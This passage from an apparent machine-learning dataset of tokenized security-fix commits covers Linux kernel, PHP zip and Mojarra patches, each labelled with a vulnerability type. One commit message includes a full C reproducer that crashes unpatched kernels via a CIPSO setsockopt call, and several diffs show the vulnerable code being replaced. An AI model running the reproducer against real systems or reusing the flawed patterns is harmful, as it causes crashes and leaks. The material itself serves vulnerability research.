"report", "-", ">", "field", "[", "0", "]", "->", "maxusage", ")", ";", "memset", "(", "report", "-", ">", "field", "[", "0", "]", "->", "value", ",", "0", ",", "sizeof", "(", "__s32", ")", "*", "report", "-", ">", "field", "[", "0", "]", "->", "report_count", ")", ";", "switch", "(", "effect", "-", ">", "type", ")", "{", "case", "FF_CONSTANT", ":", "@", "@", "-", "129", ",", "32", "+", "130", ",", "14", "@", "@", "static", "const", "signed", "short", "ff3_joystick_ac", "[", "]", "=", "{", "int", "lg3ff_init", "(", "struct", "hid_device", "*", "hid", ")", "{", "struct", "hid_input", "*", "hidinput", "=", "list_entry", "(", "hid", "-", ">", "inputs", ".", "next", ",", "struct", "hid_input", ",", "list", ")", ";", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "input_dev", "*", "dev", "=", "hidinput", "-", ">", "input", ";", "struct", "hid_report", "*", "report", ";", "struct", "hid_field", "*", "field", ";", "const", "signed", "short", "*", "ff_bits", "=", "ff3_joystick_ac", ";", "int", "error", ";", "int", "i", ";", "/", "*", "Find", "the", "report", "to", "use", "*", "/", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "No", "output", "report", "found", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "/", "*", "Check", "that", "the", "report", "looks", "ok", "*", "/", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "if", "(", "!", "report", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "output", "report", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "field", "=", "report", "-", ">", "field", "[", "0", "]", ";", "if", "(", "!", "field", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "field", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "if", "(", "!", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "35", ")", ")", "return", "-", "ENODEV", ";", "/", "*", "Assume", "single", "fixed", "device", "G940", "*", "/", "for", "(", "i", "=", "0", ";", "ff_bits", "[", "i", "]", ">", "=", "0", ";", "i", "+", "+)", "@", "@", "-", "484", ",", "34", "+", "484", ",", "16", "@", "@", "static", "enum", "led_brightness", "lg4ff_led_get_brightness", "(", "struct", "led_classdev", "*", "led_cde", "int", "lg4ff_init", "(", "struct", "hid_device", "*", "hid", ")", "{", "struct", "hid_input", "*", "hidinput", "=", "list_entry", "(", "hid", "-", ">", "inputs", ".", "next", ",", "struct", "hid_input", ",", "list", ")", ";", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "input_dev", "*", "dev", "=", "hidinput", "-", ">", "input", ";", "struct", "hid_report", "*", "report", ";", "struct", "hid_field", "*", "field", ";", "struct", "lg4ff_device_entry", "*", "entry", ";", "struct", "lg_drv_data", "*", "drv_data", ";", "struct", "usb_device_descriptor", "*", "udesc", ";", "int", "error", ",", "i", ",", "j", ";", "__u16", "bcdDevice", ",", "rev_maj", ",", "rev_min", ";", "/", "*", "Find", "the", "report", "to", "use", "*", "/", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "No", "output", "report", "found", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "/", "*", "Check", "that", "the", "report", "looks", "ok", "*", "/", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "if", "(", "!", "report", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "output", "report", "\\", "n", "\"", ");", "if", "(", "!", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "7", ")", ")", "return", "-", "1", ";", "}", "field", "=", "report", "-", ">", "field", "[", "0", "]", ";", "if", "(", "!", "field", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "field", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "/", "*", "Check", "what", "wheel", "has", "been", "connected", "*", "/", "for", "(", "i", "=", "0", ";", "i", "<", "ARRAY_SIZE", "(", "lg4ff_devices", ")", ";", "i", "+", "+)", "{", "@", "@", "-", "128", ",", "27", "+", "128", ",", "14", "@", "@", "static", "void", "hid_lgff_set_autocenter", "(", "struct", "input_dev", "*", "dev", ",", "u16", "magnitude", ")", "int", "lgff_init", "(", "struct", "hid_device", "*", "hid", ")", "{", "struct", "hid_input", "*", "hidinput", "=", "list_entry", "(", "hid", "-", ">", "inputs", ".", "next", ",", "struct", "hid_input", ",", "list", ")", ";", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "input_dev", "*", "dev", "=", "hidinput", "-", ">", "input", ";", "struct", "hid_report", "*", "report", ";", "struct", "hid_field", "*", "field", ";", "const", "signed", "short", "*", "ff_bits", "=", "ff_joystick", ";", "int", "error", ";", "int", "i", ";", "/", "*", "Find", "the", "report", "to", "use", "*", "/", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "No", "output", "report", "found", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "/", "*", "Check", "that", "the", "report", "looks", "ok", "*", "/", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "field", "=", "report", "-", ">", "field", "[", "0", "]", ";", "if", "(", "!", "field", ")", "{", "hid_err", "(", "hid", ",", "\"", "NULL", "field", "\\", "n", "\"", ");", "return", "-", "1", ";", "}", "if", "(", "!", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "7", ")", ")", "return", "-", "ENODEV", ";", "for", "(", "i", "=", "0", ";", "i", "<", "ARRAY_SIZE", "(", "devices", ")", ";", "i", "+", "+)", "{", "if", "(", "dev", "-", ">", "id", ".", "vendor", "=", "=", "devices", "[", "i", "]", ".", "idVendor", "&", "&"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["fix", "bug", "53885", "(ZipArchive", "segfault", "with", "FL_UNCHANGED", "on", "empty", "archive)"], "code_tokens": ["@", "@", "-", "60", ",", "6", "+", "60", ",", "10", "@", "@", "_zip_name_locate", "(", "struct", "zip", "*", "za", ",", "const", "char", "*", "fname", ",", "int", "flags", ",", "return", "-", "1", ";", "}", "if", "(", "(", "flags", "&", "ZIP_FL_UNCHANGED", ")", "&", "&", "!", "za", "-", ">", "cdir", ")", "{", "return", "-", "1", ";", "}", "cmp", "=", "(", "flags", "&", "ZIP_FL_NOCASE", ")", "?", "strcmpi", ":", "strcmp", ";", "n", "=", "(", "flags", "&", "ZIP_FL_UNCHANGED", ")", "?", "za", "-", ">", "cdir", "-", ">", "nentry", ":", "za", "-", ">", "nentry", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "19", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "53885", "(", "ZipArchive", "segfault", "with", "FL_UNCHANGED", "on", "empty", "archive", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "'", "zip", "'", "))", "die", "(", "'", "skip", "'", ");", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "fname", "=", "dirname", "(", "__FILE__", ")", ".\"", "/", "test53885", ".", "zip", "\"", ";", "if", "(", "file_exists", "(", "$", "fname", ")", ")", "unlink", "(", "$", "fname", ")", ";", "touch", "(", "$", "fname", ")", ";", "$", "nx", "=", "new", "ZipArchive", "(", ");", "$", "nx", "-", ">", "open", "(", "$", "fname", ")", ";", "$", "nx", "-", ">", "locateName", "(", "\"", "a", "\"", ",", "ZIPARCHIVE", ":", ":", "FL_UNCHANGED", ")", ";", "$", "nx", "-", ">", "statName", "(", "\"", "a", "\"", ",", "ZIPARCHIVE", ":", ":", "FL_UNCHANGED", ")", ";", "?", ">", "=", "=", "DONE", "=", "=", "-", "-", "EXPECTF", "-", "-", "=", "=", "DONE", "=", "="], "docstring_tokens": ["null", "pointer", "dereference"]}
{"contents": ["virt:", "vbox:", "Only", "copy_from_user", "the", "request-header", "once", "In", "vbg_misc_device_ioctl(),", "the", "header", "of", "the", "ioctl", "argument", "is", "copied", "from", "the", "userspace", "pointer", "'arg'", "and", "saved", "to", "the", "kernel", "object", "'hdr'.", "Then", "the", "'version',", "'size_in',", "and", "'size_out'", "fields", "of", "'hdr'", "are", "verified.", "Before", "this", "commit,", "after", "the", "checks", "a", "buffer", "for", "the", "entire", "request", "would", "be", "allocated", "and", "then", "all", "data", "including", "the", "verified", "header", "would", "be", "copied", "from", "the", "userspace", "'arg'", "pointer", "again.", "Given", "that", "the", "'arg'", "pointer", "resides", "in", "userspace,", "a", "malicious", "userspace", "process", "can", "race", "to", "change", "the", "data", "pointed", "to", "by", "'arg'", "between", "the", "two", "copies.", "By", "doing", "so,", "the", "user", "can", "bypass", "the", "verifications", "on", "the", "ioctl", "argument.", "This", "commit", "fixes", "this", "by", "using", "the", "already", "checked", "copy", "of", "the", "header", "to", "fill", "the", "header", "part", "of", "the", "allocated", "buffer", "and", "only", "copying", "the", "remainder", "of", "the", "data", "from", "userspace.", "Signed-off-by:", "Wenwen", "Wang", "<wang6495@umn.edu>", "Reviewed-by:", "Hans", "de", "Goede", "<hdegoede@redhat.com>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["@", "@", "-", "121", ",", "7", "+", "121", ",", "9", "@", "@", "static", "long", "vbg_misc_device_ioctl", "(", "struct", "file", "*", "filp", ",", "unsigned", "int", "req", ",", "if", "(", "!", "buf", ")", "return", "-", "ENOMEM", ";", "if", "(", "copy_from_user", "(", "buf", ",", "(", "void", "*", ")", "arg", ",", "hdr", ".", "size_in", ")", ")", "{", "*", "((", "struct", "vbg_ioctl_hdr", "*", ")", "buf", ")", "=", "hdr", ";", "if", "(", "copy_from_user", "(", "buf", "+", "sizeof", "(", "hdr", ")", ",", "(", "void", "*", ")", "arg", "+", "sizeof", "(", "hdr", ")", ",", "hdr", ".", "size_in", "-", "sizeof", "(", "hdr", ")", "))", "{", "ret", "=", "-", "EFAULT", ";", "goto", "out", ";", "}"], "docstring_tokens": ["information", "leakage"]}
{"contents": ["cipso:", "don't", "follow", "a", "NULL", "pointer", "when", "setsockopt()", "is", "called", "As", "reported", "by", "Alan", "Cox,", "and", "verified", "by", "Lin", "Ming,", "when", "a", "user", "attempts", "to", "add", "a", "CIPSO", "option", "to", "a", "socket", "using", "the", "CIPSO_V4_TAG_LOCAL", "tag", "the", "kernel", "dies", "a", "terrible", "death", "when", "it", "attempts", "to", "follow", "a", "NULL", "pointer", "(the", "skb", "argument", "to", "cipso_v4_validate()", "is", "NULL", "when", "called", "via", "the", "setsockopt()", "syscall).", "This", "patch", "fixes", "this", "by", "first", "checking", "to", "ensure", "that", "the", "skb", "is", "non-NULL", "before", "using", "it", "to", "find", "the", "incoming", "network", "interface.", "In", "the", "unlikely", "case", "where", "the", "skb", "is", "NULL", "and", "the", "user", "attempts", "to", "add", "a", "CIPSO", "option", "with", "the", "_TAG_LOCAL", "tag", "we", "return", "an", "error", "as", "this", "is", "not", "something", "we", "want", "to", "allow.", "A", "simple", "reproducer,", "kindly", "supplied", "by", "Lin", "Ming,", "although", "you", "must", "have", "the", "CIPSO", "DOI", "#3", "configure", "on", "the", "system", "first", "or", "you", "will", "be", "caught", "early", "in", "cipso_v4_validate():", "#include", "<sys/types.h>", "#include", "<sys/socket.h>", "#include", "<linux/ip.h>", "#include", "<linux/in.h>", "#include", "<string.h>", "struct", "local_tag", "{", "char", "type;", "char", "length;", "char", "info[4];", "};", "struct", "cipso", "{", "char", "type;", "char", "length;", "char", "doi[4];", "struct", "local_tag", "local;", "};", "int", "main(int", "argc,", "char", "**argv)", "{", "int", "sockfd;", "struct", "cipso", "cipso", "=", "{", ".type", "=", "IPOPT_CIPSO,", ".length", "=", "sizeof(struct", "cipso),", ".local", "=", "{", ".type", "=", "128,", ".length", "=", "sizeof(struct", "local_tag),", "},", "};", "memset(cipso.doi,", "0,", "4);", "cipso.doi[3]", "=", "3;", "sockfd", "=", "socket(AF_INET,", "SOCK_DGRAM,", "0);", "#define", "SOL_IP", "0", "setsockopt(sockfd,", "SOL_IP,", "IP_OPTIONS,", "&cipso,", "sizeof(struct", "cipso));", "return", "0;", "}", "CC:", "Lin", "Ming", "<mlin@ss.pku.edu.cn>", "Reported-by:", "Alan", "Cox", "<alan@lxorguk.ukuu.org.uk>", "Signed-off-by:", "Paul", "Moore", "<pmoore@redhat.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "1725", ",", "8", "+", "1725", ",", "10", "@", "@", "int", "cipso_v4_validate", "(", "const", "struct", "sk_buff", "*", "skb", ",", "unsigned", "char", "*", "*", "option", ")", "case", "CIPSO_V4_TAG_LOCAL", ":", "/", "*", "This", "is", "a", "non", "-", "standard", "tag", "that", "we", "only", "allow", "for", "*", "local", "connections", ",", "so", "if", "the", "incoming", "interface", "is", "*", "not", "the", "loopback", "device", "drop", "the", "packet", ".", "*", "/", "if", "(", "!(", "skb", "-", ">", "dev", "-", ">", "flags", "&", "IFF_LOOPBACK", ")", ")", "{", "*", "not", "the", "loopback", "device", "drop", "the", "packet", ".", "Further", ",", "*", "there", "is", "no", "legitimate", "reason", "for", "setting", "this", "from", "*", "userspace", "so", "reject", "it", "if", "skb", "is", "NULL", ".", "*", "/", "if", "(", "skb", "=", "=", "NULL", "|", "|", "!", "(", "skb", "-", ">", "dev", "-", ">", "flags", "&", "IFF_LOOPBACK", ")", ")", "{", "err_offset", "=", "opt_iter", ";", "goto", "validate_return_locked", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["Merge", "pull", "request", "#4567", "from", "ruolli/Issue_4556", "Fixes", "#4556", ":", "HIGH-LEVEL", "VULNERABILITY", "WITHIN", "MOJARRA", "JSF", "V2.2"], "code_tokens": ["@", "@", "-", "511", ",", "7", "+", "511", ",", "7", "@", "@", "private", "void", "renderState", "(", "FacesContext", "context", ")", "throws", "IOException", "{", "if", "(", "null", "!", "=", "window", ")", "{", "String", "clientWindowId", "=", "Util", ".", "getClientWindowId", "(", "context", ")", ";", "writer", ".", "startUpdate", "(", "clientWindowId", ")", ";", "writer", ".", "write", "(", "window", ".", "getId", "(", "))", ";", "writer", ".", "writeText", "(", "window", ".", "getId", "(", "),", "null", ")", ";", "writer", ".", "endUpdate", "(", ");", "}", "}"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["ext4:", "race-condition", "protection", "for", "ext4_convert_unwritten_extents_endio", "We", "assumed", "that", "at", "the", "time", "we", "call", "ext4_convert_unwritten_extents_endio()", "extent", "in", "question", "is", "fully", "inside", "[map.m_lblk,", "map->m_len]", "because", "it", "was", "already", "split", "during", "submission.", "But", "this", "may", "not", "be", "true", "due", "to", "a", "race", "between", "writeback", "vs", "fallocate.", "If", "extent", "in", "question", "is", "larger", "than", "requested", "we", "will", "split", "it", "again.", "Special", "precautions", "should", "being", "done", "if", "zeroout", "required", "because", "[map.m_lblk,", "map->m_len]", "already", "contains", "valid", "data.", "Signed-off-by:", "Dmitry", "Monakhov", "<dmonakhov@openvz.org>", "Signed-off-by:", "\"Theodore", "Ts'o\"", "<tytso@mit.edu>", "Cc:", "stable@vger.kernel.org"], "code_tokens": ["@", "@", "-", "52", ",", "6", "+", "52", ",", "9", "@", "@", "#", "define", "EXT4_EXT_MARK_UNINIT1", "0x2", "/", "*", "mark", "first", "half", "uninitialized", "*", "/", "#", "define", "EXT4_EXT_MARK_UNINIT2", "0x4", "/", "*", "mark", "second", "half", "uninitialized", "*", "/", "#", "define", "EXT4_EXT_DATA_VALID1", "0x8", "/", "*", "first", "half", "contains", "valid", "data", "*", "/", "#", "define", "EXT4_EXT_DATA_VALID2", "0x10", "/", "*", "second", "half", "contains", "valid", "data", "*", "/", "static", "__le32", "ext4_extent_block_csum", "(", "struct", "inode", "*", "inode", ",", "struct", "ext4_extent_header", "*", "eh", ")", "{", "@", "@", "-", "2914", ",", "6", "+", "2917", ",", "9", "@", "@", "static", "int", "ext4_split_extent_at", "(", "handle_t", "*", "handle", ",", "unsigned", "int", "ee_len", ",", "depth", ";", "int", "err", "=", "0", ";", "BUG_ON", "(", "(", "split_flag", "&", "(", "EXT4_EXT_DATA_VALID1", "|", "EXT4_EXT_DATA_VALID2", ")", ")", "=", "=", "(", "EXT4_EXT_DATA_VALID1", "|", "EXT4_EXT_DATA_VALID2", ")", ");", "ext_debug", "(", "\"", "ext4_split_extents_at", ":", "inode", "%", "lu", ",", "logical", "\"", "\"", "block", "%", "llu", "\\", "n", "\"", ",", "inode", "-", ">", "i_ino", ",", "(", "unsigned", "long", "long", ")", "split", ")", ";", "@", "@", "-", "2972", ",", "7", "+", "2978", ",", "14", "@", "@", "static", "int", "ext4_split_extent_at", "(", "handle_t", "*", "handle", ",", "err", "=", "ext4_ext_insert_extent", "(", "handle", ",", "inode", ",", "path", ",", "&", "newex", ",", "flags", ")", ";", "if", "(", "err", "=", "=", "-", "ENOSPC", "&", "&", "(", "EXT4_EXT_MAY_ZEROOUT", "&", "split_flag", ")", ")", "{", "err", "=", "ext4_ext_zeroout", "(", "inode", ",", "&", "orig_ex", ")", ";", "if", "(", "split_flag", "&", "(", "EXT4_EXT_DATA_VALID1", "|", "EXT4_EXT_DATA_VALID2", ")", ")", "{", "if", "(", "split_flag", "&", "EXT4_EXT_DATA_VALID1", ")", "err", "=", "ext4_ext_zeroout", "(", "inode", ",", "ex2", ")", ";", "else", "err", "=", "ext4_ext_zeroout", "(", "inode", ",", "ex", ")", ";", "}", "else", "err", "=", "ext4_ext_zeroout", "(", "inode", ",", "&", "orig_ex", ")", ";", "if", "(", "err", ")", "goto", "fix_extent_len", ";", "/", "*", "update", "the", "extent", "length", "and", "mark", "as", "initialized", "*", "/", "@", "@", "-", "3025", ",", "12", "+", "3038", ",", "13", "@", "@", "static", "int", "ext4_split_extent", "(", "handle_t", "*", "handle", ",", "uninitialized", "=", "ext4_ext_is_uninitialized", "(", "ex", ")", ";", "if", "(", "map", "-", ">", "m_lblk", "+", "map", "-", ">", "m_len", "<", "ee_block", "+", "ee_len", ")", "{", "split_flag1", "=", "split_flag", "&", "EXT4_EXT_MAY_ZEROOUT", "?", "EXT4_EXT_MAY_ZEROOUT", ":", "0", ";", "split_flag1", "=", "split_flag", "&", "EXT4_EXT_MAY_ZEROOUT", ";", "flags1", "=", "flags", "|", "EXT4_GET_BLOCKS_PRE_IO", ";", "if", "(", "uninitialized", ")", "split_flag1", "|", "=", "EXT4_EXT_MARK_UNINIT1", "|", "EXT4_EXT_MARK_UNINIT2", ";", "if", "(", "split_flag", "&", "EXT4_EXT_DATA_VALID2", ")", "split_flag1", "|", "=", "EXT4_EXT_DATA_VALID1", ";", "err", "=", "ext4_split_extent_at", "(", "handle", ",", "inode", ",", "path", ",", "map", "-", ">", "m_lblk", "+", "map", "-", ">", "m_len", ",", "split_flag1", ",", "flags1", ")", ";", "if", "(", "err", ")", "@", "@", "-", "3043", ",", "8", "+", "3057", ",", "8", "@", "@", "static", "int", "ext4_split_extent", "(", "handle_t", "*", "handle", ",", "return", "PTR_ERR", "(", "path", ")", ";", "if", "(", "map", "-", ">", "m_lblk", ">", "=", "ee_block", ")", "{", "split_flag1", "=", "split_flag", "&", "EXT4_EXT_MAY_ZEROOUT", "?", "EXT4_EXT_MAY_ZEROOUT", ":", "0", ";", "split_flag1", "=", "split_flag", "&", "(", "EXT4_EXT_MAY_ZEROOUT", "|", "EXT4_EXT_DATA_VALID2", ")", ";", "if", "(", "uninitialized", ")", "split_flag1", "|", "=", "EXT4_EXT_MARK_UNINIT1", ";", "if", "(", "split_flag", "&", "EXT4_EXT_MARK_UNINIT2", ")", "@", "@", "-", "3323", ",", "26", "+", "3337", ",", "47", "@", "@", "static", "int", "ext4_split_unwritten_extents", "(", "handle_t", "*", "handle", ",", "split_flag", "|", "=", "ee_block", "+", "ee_len", "<", "=", "eof_block", "?", "EXT4_EXT_MAY_ZEROOUT", ":", "0", ";", "split_flag", "|", "=", "EXT4_EXT_MARK_UNINIT2", ";", "if", "(", "flags", "&", "EXT4_GET_BLOCKS_CONVERT", ")", "split_flag", "|", "=", "EXT4_EXT_DATA_VALID2", ";", "flags", "|", "=", "EXT4_GET_BLOCKS_PRE_IO", ";", "return", "ext4_split_extent", "(", "handle", ",", "inode", ",", "path", ",", "map", ",", "split_flag", ",", "flags", ")", ";", "}", "static", "int", "ext4_convert_unwritten_extents_endio", "(", "handle_t", "*", "handle", ",", "struct", "inode", "*", "inode", ",", "struct", "ext4_ext_path", "*", "path", ")", "struct", "inode", "*", "inode", ",", "struct", "ext4_map_blocks", "*", "map", ",", "struct", "ext4_ext_path", "*", "path", ")", "{", "struct", "ext4_extent", "*", "ex", ";", "ext4_lblk_t", "ee_block", ";", "unsigned", "int", "ee_len", ";", "int", "depth", ";", "int", "err", "=", "0", ";", "depth", "=", "ext_depth", "(", "inode", ")", ";", "ex", "=", "path", "[", "depth", "]", ".", "p_ext", ";", "ee_block", "=", "le32_to_cpu", "(", "ex", "-", ">", "ee_block", ")", ";", "ee_len", "=", "ext4_ext_get_actual_len", "(", "ex", ")", ";", "ext_debug", "(", "\"", "ext4_convert_unwritten_extents_endio", ":", "inode", "%", "lu", ",", "logical", "\"", "\"", "block", "%", "llu", ",", "max_blocks", "%", "u", "\\", "n", "\"", ",", "inode", "-", ">", "i_ino", ",", "(", "unsigned", "long", "long", ")", "le32_to_cpu", "(", "ex", "-", ">", "ee_block", ")", ",", "ext4_ext_get_actual_len", "(", "ex", ")", ");", "(", "unsigned", "long", "long", ")", "ee_block", ",", "ee_len", ")", ";", "/", "*", "If", "extent", "is", "larger", "than", "requested", "then", "split", "is", "required", "*", "/", "if", "(", "ee_block", "!", "=", "map", "-", ">", "m_lblk", "|", "|", "ee_len", ">", "map", "-", ">", "m_len", ")", "{", "err", "=", "ext4_split_unwritten_extents", "(", "handle", ",", "inode", ",", "map", ",", "path", ",", "EXT4_GET_BLOCKS_CONVERT", ")", ";", "if", "(", "err", "<", "0", ")", "goto", "out", ";", "ext4_ext_drop_refs", "(", "path", ")", ";", "path", "=", "ext4_ext_find_extent", "(", "inode", ",", "map", "-", ">", "m_lblk", ",", "path", ")", ";", "if", "(", "IS_ERR", "(", "path", ")", ")", "{", "err", "=", "PTR_ERR", "(", "path", ")", ";", "goto", "out", ";", "}", "depth", "=", "ext_depth", "(", "inode", ")", ";", "ex", "=", "path", "[", "depth", "]", ".", "p_ext", ";", "}", "err", "=", "ext4_ext_get_access", "(", "handle", ",", "inode", ",", "path", "+", "depth", ")", ";", "if", "(", "err", ")", "@", "@", "-", "3652", ",", "7", "+", "3687", ",", "7", "@", "@", "ext4_ext_handle_uninitialized_extents", "(", "handle_t", "*", "handle", ",", "struct", "inode", "*", "inode", ",", "}", "/", "*", "IO", "end_io", "complete", ",", "convert", "the", "filled", "extent", "to", "written", "*", "/", "if", "(", "(", "flags", "&", "EXT4_GET_BLOCKS_CONVERT", ")", ")", "{", "ret", "=", "ext4_convert_unwritten_extents_endio", "(", "handle", ",", "inode", ",", "ret", "=", "ext4_convert_unwritten_extents_endio", "(", "handle", ",", "inode", ",", "map", ",", "path", ")", ";", "if", "(", "ret", ">", "=", "0", ")", "{", "ext4_update_inode_fsync_trans", "(", "handle", ",", "inode", ",", "1", ")", ";"], "docstring_tokens": ["information", "leak"]}
{"contents": ["sys_semctl:", "fix", "kernel", "stack", "leakage", "The", "semctl", "syscall", "has", "several", "code", "paths", "that", "lead", "to", "the", "leakage", "of", "uninitialized", "kernel", "stack", "memory", "(namely", "the", "IPC_INFO,", "SEM_INFO,", "IPC_STAT,", "and", "SEM_STAT", "commands)", "during", "the", "use", "of", "the", "older,", "obsolete", "version", "of", "the", "semid_ds", "struct.", "The", "copy_semid_to_user()", "function", "declares", "a", "semid_ds", "struct", "on", "the", "stack", "and", "copies", "it", "back", "to", "the", "user", "without", "initializing", "or", "zeroing", "the", "\"sem_base\",", "\"sem_pending\",", "\"sem_pending_last\",", "and", "\"undo\"", "pointers,", "allowing", "the", "leakage", "of", "16", "bytes", "of", "kernel", "stack", "memory.", "The", "code", "is", "still", "reachable", "on", "32-bit", "systems", "-", "when", "calling", "semctl()", "newer", "glibc's", "automatically", "OR", "the", "IPC", "command", "with", "the", "IPC_64", "flag,", "but", "invoking", "the", "syscall", "directly", "allows", "users", "to", "use", "the", "older", "versions", "of", "the", "struct.", "Signed-off-by:", "Dan", "Rosenberg", "<dan.j.rosenberg@gmail.com>", "Cc:", "Manfred", "Spraul", "<manfred@colorfullife.com>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "743", ",", "6", "+", "743", ",", "8", "@", "@", "static", "unsigned", "long", "copy_semid_to_user", "(", "void", "__user", "*", "buf", ",", "struct", "semid64_ds", "*", "in", ",", "{", "struct", "semid_ds", "out", ";", "memset", "(", "&", "out", ",", "0", ",", "sizeof", "(", "out", ")", ");", "ipc64_perm_to_ipc_perm", "(", "&", "in", "-", ">", "sem_perm", ",", "&", "out", ".", "sem_perm", ")", ";", "out", ".", "sem_otime", "=", "in", "-", ">", "sem_otime", ";"], "docstring_tokens": ["stack", "leak"]}
{"contents": ["x86/entry/64:", "Don't", "use", "IST", "entry", "for", "#BP", "stack", "There's", "nothing", "IST-worthy", "about", "#BP/int3.", "We", "don't", "allow", "kprobes", "in", "the", "small", "handful", "of", "places", "in", "the", "kernel", "that", "run", "at", "CPL0", "with", "an", "invalid", "stack,", "and", "32-bit", "kernels", "have", "used", "normal", "interrupt", "gates", "for", "#BP", "forever.", "Furthermore,", "we", "don't", "allow", "kprobes", "in", "places", "that", "have", "usergs", "while", "in", "kernel", "mode,", "so", "\"paranoid\"", "is", "also", "unnecessary.", "Signed-off-by:", "Andy", "Lutomirski", "<luto@kernel.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>", "Signed-off-by:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Cc:", "stable@vger.kernel.org"], "code_tokens": ["@", "@", "-", "1138", ",", "7", "+", "1138", ",", "7", "@", "@", "apicinterrupt3", "HYPERV_REENLIGHTENMENT_VECTOR", "\\", "#", "endif", "/", "*", "CONFIG_HYPERV", "*", "/", "idtentry", "debug", "do_debug", "has_error_code", "=", "0", "paranoid", "=", "1", "shift_ist", "=", "DEBUG_STACK", "idtentry", "int3", "do_int3", "has_error_code", "=", "0", "paranoid", "=", "1", "shift_ist", "=", "DEBUG_STACK", "idtentry", "int3", "do_int3", "has_error_code", "=", "0", "idtentry", "stack_segment", "do_stack_segment", "has_error_code", "=", "1", "#", "ifdef", "CONFIG_XEN", "@", "@", "-", "160", ",", "7", "+", "160", ",", "6", "@", "@", "static", "const", "__initconst", "struct", "idt_data", "early_pf_idts", "[", "]", "=", "{", "*", "/", "static", "const", "__initconst", "struct", "idt_data", "dbg_idts", "[", "]", "=", "{", "INTG", "(", "X86_TRAP_DB", ",", "debug", ")", ",", "INTG", "(", "X86_TRAP_BP", ",", "int3", ")", ",", "}", ";", "#", "endif", "@", "@", "-", "183", ",", "7", "+", "182", ",", "6", "@", "@", "gate_desc", "debug_idt_table", "[", "IDT_ENTRIES", "]", "__page_aligned_bss", ";", "static", "const", "__initconst", "struct", "idt_data", "ist_idts", "[", "]", "=", "{", "ISTG", "(", "X86_TRAP_DB", ",", "debug", ",", "DEBUG_STACK", ")", ",", "ISTG", "(", "X86_TRAP_NMI", ",", "nmi", ",", "NMI_STACK", ")", ",", "SISTG", "(", "X86_TRAP_BP", ",", "int3", ",", "DEBUG_STACK", ")", ",", "ISTG", "(", "X86_TRAP_DF", ",", "double_fault", ",", "DOUBLEFAULT_STACK", ")", ",", "#", "ifdef", "CONFIG_X86_MCE", "ISTG", "(", "X86_TRAP_MC", ",", "&", "machine_check", ",", "MCE_STACK", ")", ",", "@", "@", "-", "577", ",", "7", "+", "577", ",", "6", "@", "@", "do_general_protection", "(", "struct", "pt_regs", "*", "regs", ",", "long", "error_code", ")", "}", "NOKPROBE_SYMBOL", "(", "do_general_protection", ")", ";", "/", "*", "May", "run", "on", "IST", "stack", ".", "*", "/", "dotraplinkage", "void", "notrace", "do_int3", "(", "struct", "pt_regs", "*", "regs", ",", "long", "error_code", ")", "{", "#", "ifdef", "CONFIG_DYNAMIC_FTRACE", "@", "@", "-", "592", ",", "6", "+", "591", ",", "13", "@", "@", "dotraplinkage", "void", "notrace", "do_int3", "(", "struct", "pt_regs", "*", "regs", ",", "long", "error_code", ")", "if", "(", "poke_int3_handler", "(", "regs", ")", ")", "return", ";", "/", "*", "*", "Use", "ist_enter", "despite", "the", "fact", "that", "we", "don", "'", "t", "use", "an", "IST", "stack", ".", "*", "We", "can", "be", "called", "from", "a", "kprobe", "in", "non", "-", "CONTEXT_KERNEL", "kernel", "*", "mode", "or", "even", "during", "context", "tracking", "state", "changes", ".", "*", "*", "This", "means", "that", "we", "can", "'", "t", "schedule", ".", "That", "'", "s", "okay", ".", "*", "/", "ist_enter", "(", "regs", ")", ";", "RCU_LOCKDEP_WARN", "(", "!", "rcu_is_watching", "(", "),", "\"", "entry", "code", "didn", "'", "t", "wake", "RCU", "\"", ");", "#", "ifdef", 